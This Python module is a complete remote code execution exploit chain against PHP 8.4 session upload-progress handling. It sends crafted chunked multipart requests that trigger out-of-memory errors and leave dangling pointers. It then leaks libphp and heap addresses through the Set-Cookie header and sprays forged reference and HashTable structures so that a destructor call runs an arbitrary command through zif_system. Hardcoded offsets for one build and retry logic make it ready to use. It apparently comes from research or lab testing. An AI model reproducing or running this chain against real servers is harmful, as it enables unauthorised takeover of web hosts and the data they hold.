"""pure128 chain for the clean-room p2s package (docs/76 R3, docs/40).

``display_errors=Off`` / stock-ini / 128M.  The chain is independent of the
warning path:

  A1  END-cleanup OOM in php_session_reset_id -> dangling PS(id) + send_cookie
  B1  the next request reads past the stale id (Set-Cookie) -> chunk + libphp
  A2  cheap OOM on nested empty-file fields -> dangling PS(http_session_vars)
  B2  fake reference spray + fake HashTable -> pDestructor = zif_system

Each request opens its own connection: A1/A2 OOM the worker and it answers
with ``Connection: close``.  Bodies are sent chunked with no Content-Length so
PHP skips the ``post_max_size`` guard.

The request shapes are protocol constants measured in docs/40/44/58; the code
here is an independent implementation (the pure128 family is project-owned,
not upstream-derived; see docs/76 §2.2).
"""
from __future__ import annotations

import struct
import time
from collections import Counter
from dataclasses import dataclass, field
from typing import Callable

from . import transport

CRLF = b"\r\n"
BOUNDARY = "C" * 10

PTR_MIN = 0x0000_0100_0000_0000       # 1 TiB
PTR_MAX = 0x0100_0000_0000_0000       # 64 PiB
USER_PTR_MAX_X86_64 = 0x0000_7FFF_FFFF_FFFF

MAX_CMD = 231                          # 384-byte fake array - 0x98 - NUL
MAIN_BUCKET_COUNT = 87
LEAK_SPEC = ",".join(["G:511:0x137"] * 14
                     + ["G:400:0x137", "G:511:0x137", "X:900"])


class PureError(RuntimeError):
    """The pure128 chain could not be built or completed."""


@dataclass(frozen=True)
class PureGeometry:
    dtor_offset: int
    zif_offset: int
    s_offset: int
    delta_min: int
    delta_max: int
    n1: int = 500
    n2: int = 495
    arch: str = "x86_64"


# Only builds with an end-to-end proof are listed.  8.4.26 is the lab baseline
# (profiles.py: dtor 0x65EB60, zif 0x465370, S=main+0xF8398, 500/495 sprays).
_GEOMETRY = {
    "8.4.26": PureGeometry(dtor_offset=0x65EB60, zif_offset=0x465370,
                           s_offset=0xF8398,
                           delta_min=0x1A00000, delta_max=0x1F00000),
}


def geometry(version: str) -> PureGeometry:
    geo = _GEOMETRY.get(version)
    if geo is None:
        raise PureError("no verified pure128 geometry for PHP %s (known: %s)"
                        % (version, ", ".join(sorted(_GEOMETRY))))
    return geo


@dataclass
class PureConfig:
    cmd: bytes
    sid_hex: str = "00"
    parts: int = 860
    depth: int = 64
    key_pad: int = 90
    fillers128: int = 14
    big: int = 78
    big_len: int = 8000
    burners: int = 20
    burner_len: int = 4000
    progress_len: int = 4000
    fake_len: int = 0xC8000
    spec: str = LEAK_SPEC
    name_len: int = 120
    a2_parts: int = 880
    a2_fillers: int = 115
    spray_len: int = 384
    retries: int = 2
    timeout: float = 120.0


@dataclass
class PureResult:
    proof: str = ""
    lib: int = 0
    zdtor: int = 0
    main: int = 0
    s: int = 0
    zif: int = 0
    decoded: int = 0
    attempts: int = 0
    candidates: tuple[int, ...] = ()

    @property
    def passed(self) -> bool:
        return bool(self.proof)


def _part(out: bytearray, name: bytes, value: bytes = b"", *,
          filename: bytes | None = None, ctype: bytes | None = None,
          body: bool = True) -> None:
    out.extend(b"--" + BOUNDARY.encode() + CRLF)
    out.extend(b'Content-Disposition: form-data; name="' + name + b'"')
    if filename is not None:
        out.extend(b'; filename="' + filename + b'"')
    out.extend(CRLF)
    if ctype is not None:
        out.extend(b"Content-Type: " + ctype + CRLF)
    out.extend(CRLF)
    if body:
        out.extend(value + CRLF)


def _nest_name(i: int, depth: int, key_pad: int) -> bytes:
    return (b"files[R%05d" % i + b"K" * key_pad + b"]"
            + b"[a]" * (depth - 2))


def build_a1(cfg: PureConfig) -> bytes:
    """A1: END-cleanup send_cookie OOM (docs/40)."""
    out = bytearray()
    _part(out, b"PHPSESSID", bytes.fromhex(cfg.sid_hex))
    for i in range(cfg.parts):
        name = _nest_name(i, cfg.depth, cfg.key_pad)
        if i == 0:
            ctype = b"C" * 103
        elif i == 1:
            ctype = b"C" * 231
        else:
            ctype = b"application/octet-stream"
        _part(out, name, filename=(b"A" if i < 2 else b""),
              ctype=ctype, body=False)
    for i in range(cfg.fillers128):
        _part(out, ("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(cfg.big):
        _part(out, ("b%04d" % i).encode(), b"B" * cfg.big_len)
    for i in range(cfg.burners):
        _part(out, ("u%02d" % i).encode(), b"U" * cfg.burner_len)
    _part(out, b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * cfg.progress_len)
    out.extend(b"--" + BOUNDARY.encode() + b"--" + CRLF)
    return bytes(out)


def _tag(idx: int, tagged: bool) -> bytes:
    return (b"/" + b"%02dBBBBB" % (idx % 100)) if tagged else b"BBBB/BBB"


def forge_value(page: int, fake_len: int, idx: int, tagged: bool) -> bytes:
    """Value whose fake zend_string header lands at page*0x1000."""
    hdr = page * 0x1000 - 0x1018
    v = bytearray(b"A" * (hdr + 0x18 + 8))
    struct.pack_into("<I", v, hdr + 0x00, 0)          # rc 0: no free
    struct.pack_into("<I", v, hdr + 0x04, 0x16)       # IS_STRING|NOT_COLLECT
    struct.pack_into("<Q", v, hdr + 0x08, 0)          # h
    struct.pack_into("<Q", v, hdr + 0x10, fake_len)   # forged len
    v[hdr + 0x18:hdr + 0x18 + 8] = _tag(idx, tagged)[:8]
    return bytes(v)


def fill_value(pages: int, page: int, fake_len: int, idx: int,
               tagged: bool) -> bytes:
    """Full-chunk flood with a fake header at chunk + page*0x1000."""
    length = pages * 4096 - 25
    v = bytearray(b"A" * length)
    hdr = page * 0x1000 - 0x1018
    if 0 <= hdr and hdr + 0x20 <= length:
        struct.pack_into("<I", v, hdr + 0x00, 0)
        struct.pack_into("<I", v, hdr + 0x04, 0x16)
        struct.pack_into("<Q", v, hdr + 0x08, 0)
        struct.pack_into("<Q", v, hdr + 0x10, fake_len)
        v[hdr + 0x18:hdr + 0x18 + 8] = _tag(idx, tagged)[:8]
    return bytes(v)


def build_b1(cfg: PureConfig) -> bytes:
    """B1: stale-id OOB read (chunk + libphp)."""
    out = bytearray()
    _part(out, b"PHPSESSID", b"a")
    items = cfg.spec.replace(",", " ").split()
    if not any(it.partition(":")[0] == "P" for it in items):
        _part(out, b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    idx = 0
    for item in items:
        kind, _, arg = item.partition(":")
        name = ("f%04d" % idx).encode().ljust(cfg.name_len, b"f")[:cfg.name_len]
        if kind in ("F", "S"):
            pages = int(arg, 0)
            fill = b"A" if kind == "F" else b"S"
            _part(out, name, fill * (pages * 4096 - 25))
        elif kind == "A":
            _part(out, name, forge_value(int(arg, 0), cfg.fake_len, idx,
                                         True))
        elif kind == "G":
            pages_s, _, page_s = arg.partition(":")
            _part(out, name, fill_value(int(pages_s, 0), int(page_s, 0),
                                        cfg.fake_len, idx, True))
        elif kind == "X":
            for _ in range(int(arg, 0)):
                _part(out, ("x%05d" % idx).encode() + b"[a]" * 12, b"v")
                idx += 1
            continue
        else:
            continue
        idx += 1
    out.extend(b"--" + BOUNDARY.encode() + b"--" + CRLF)
    return bytes(out)


def build_a2(cfg: PureConfig) -> bytes:
    """A2: cheap OOM -> dangling PS(http_session_vars)."""
    out = bytearray()
    _part(out, b"PHPSESSID", b"a" * 32)
    _part(out, b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(cfg.a2_fillers):
        _part(out, ("%03d" % i).encode(), b"x")
    for i in range(cfg.a2_parts):
        _part(out, _nest_name(i, cfg.depth, 0), filename=b"",
              ctype=b"application/octet-stream", body=False)
    out.extend(b"--" + BOUNDARY.encode() + b"--" + CRLF)
    return bytes(out)


def build_ht(htdata: int, zif: int, cmd: bytes, size: int = 384) -> bytes:
    """384-byte fake zend_array + fake execute_data (same layout as stage3)."""
    if len(cmd) > MAX_CMD:
        raise PureError("command is %d bytes; the pure128 layout allows %d"
                        % (len(cmd), MAX_CMD))
    ht = bytearray(size)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif)
    e = 0x20
    struct.pack_into("<Q", ht, e + 0x00, 0)
    struct.pack_into("<Q", ht, e + 0x08, 0)
    struct.pack_into("<Q", ht, e + 0x10, zif)
    struct.pack_into("<Q", ht, e + 0x18, 0)
    struct.pack_into("<Q", ht, e + 0x20, 0)
    struct.pack_into("<I", ht, e + 0x28, 0)
    struct.pack_into("<I", ht, e + 0x2C, 1)
    struct.pack_into("<Q", ht, e + 0x30, 0)
    struct.pack_into("<Q", ht, e + 0x38, 0)
    struct.pack_into("<I", ht, e + 0x40, 0)
    struct.pack_into("<Q", ht, e + 0x50, htdata + 0x80)
    struct.pack_into("<I", ht, e + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def _spray(ht_addr: int, length: int) -> bytes:
    ref = bytearray(32)
    struct.pack_into("<I", ref, 0, 1)        # rc=1: destructor runs
    ref[4] = 0x0A                            # IS_REFERENCE
    struct.pack_into("<Q", ref, 8, ht_addr)  # val.value -> fake HashTable
    struct.pack_into("<I", ref, 16, 0x0107)  # IS_ARRAY_EX
    v = bytearray(b"S" * length)
    off = 8
    while off + 32 <= length:
        v[off:off + 32] = ref
        off += 32
    return bytes(v)


def build_b2(cfg: PureConfig, ht: bytes, ht_addr: int, n1: int,
             n2: int) -> bytes:
    out = bytearray()
    one = _spray(ht_addr, cfg.spray_len)
    for i in range(n1):
        _part(out, (b"s" + b"%09d" % i)[:10], one)
    _part(out, b"ht", ht)
    _part(out, b"PHPSESSID", b"a" * 32)
    _part(out, b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(n2):
        _part(out, (b"t" + b"%09d" % i)[:10], one)
    out.extend(b"--" + BOUNDARY.encode() + b"--" + CRLF)
    return bytes(out)


def detect_arch(pointer: int) -> str:
    return "aarch64" if pointer > USER_PTR_MAX_X86_64 else "x86_64"


def parse_leak(raw: bytes, dtor_offset: int,
               ptr_min: int = PTR_MIN,
               ptr_max: int = PTR_MAX) -> dict | None:
    """Decode the B1 Set-Cookie and rank chunk buckets."""
    decoded = transport.parse_set_cookie(raw)
    if not decoded:
        return None
    counts: Counter[int] = Counter()
    for off in range(0, max(0, len(decoded) - 8), 8):
        q = struct.unpack_from("<Q", decoded, off)[0]
        if ptr_min <= q < ptr_max and (q & 7) == 0:
            counts[q] += 1
    if not counts:
        return None
    zdtor, _n = counts.most_common(1)[0]
    buckets: Counter[int] = Counter()
    for q, c in counts.items():
        buckets[q & ~0x1FFFFF] += c
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    cands = [(b, c) for b, c in buckets.most_common()
             if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: (abs(bc[1] - MAIN_BUCKET_COUNT), bc[1]))
    return {"decoded": len(decoded), "zdtor": zdtor,
            "lib": zdtor - dtor_offset, "buckets": buckets,
            "main_candidates": [b for b, _ in cands[:3]]}


def run(endpoint: transport.Endpoint, cfg: PureConfig, geo: PureGeometry, *,
        check_proof: Callable[[], str],
        log: Callable[[str], None] | None = None,
        attempts: int | None = None) -> PureResult:
    """A1 -> B1 -> (A2 -> B2) per main candidate; proof decides."""
    say = log or (lambda _m: None)
    if len(cfg.cmd) > MAX_CMD:
        raise PureError("command is %d bytes; pure128 allows %d"
                        % (len(cfg.cmd), MAX_CMD))
    tries = attempts or cfg.retries
    result = PureResult()
    for attempt in range(1, tries + 1):
        result.attempts = attempt
        say("[*] pure128 attempt %d/%d" % (attempt, tries))
        a1 = build_a1(cfg)
        try:
            transport.post_chunked_raw(endpoint, a1, BOUNDARY,
                                       timeout=cfg.timeout, read_cap=1 << 20)
        except OSError as exc:
            say("[-] A1 error: %s" % exc)
            continue
        time.sleep(0.2)

        b1 = build_b1(cfg)
        try:
            raw = transport.post_chunked_raw(endpoint, b1, BOUNDARY,
                                             timeout=max(400.0, cfg.timeout),
                                             read_cap=4 << 20)
        except OSError as exc:
            say("[-] B1 error: %s" % exc)
            continue
        info = parse_leak(raw, geo.dtor_offset)
        if not info:
            say("[-] B1: no heap pointers in the leak window")
            continue
        arch = detect_arch(info["zdtor"])
        if arch != geo.arch:
            raise PureError("leaked pointer 0x%x looks like %s, but the "
                            "geometry is %s" % (info["zdtor"], arch, geo.arch))
        result.lib = info["lib"]
        result.zdtor = info["zdtor"]
        result.decoded = info["decoded"]
        result.candidates = tuple(info["main_candidates"])
        say("[+] leak decoded=%d zdtor=0x%x lib=0x%x"
            % (info["decoded"], info["zdtor"], info["lib"]))
        say("[+] buckets: "
            + str([(hex(b), c) for b, c in info["buckets"].most_common(5)]))
        zif = info["lib"] + geo.zif_offset
        for main in info["main_candidates"]:
            delta = info["lib"] - main
            if not (geo.delta_min <= delta <= geo.delta_max):
                say("[-] skip main=0x%x delta=0x%x" % (main, delta))
                continue
            s = main + geo.s_offset
            result.main, result.s, result.zif = main, s, zif
            say("[*] A2+B2 main=0x%x S=0x%x zif=0x%x" % (main, s, zif))
            a2 = build_a2(cfg)
            ht = build_ht(s, zif, cfg.cmd)
            b2 = build_b2(cfg, ht, s, geo.n1, geo.n2)
            try:
                transport.post_chunked_raw(endpoint, a2, BOUNDARY,
                                           timeout=cfg.timeout,
                                           read_cap=1 << 20)
            except OSError as exc:
                say("[-] A2 error: %s" % exc)
                continue
            time.sleep(0.2)
            try:
                transport.post_chunked_raw(endpoint, b2, BOUNDARY,
                                           timeout=60.0, read_cap=65536)
            except OSError as exc:
                say("[-] B2 error: %s" % exc)
            time.sleep(0.8)
            proof = check_proof()
            if proof:
                result.proof = proof
                say("[+] pure128 proof (attempt %d)" % attempt)
                return result
            say("[-] B2: no proof yet")
    return result
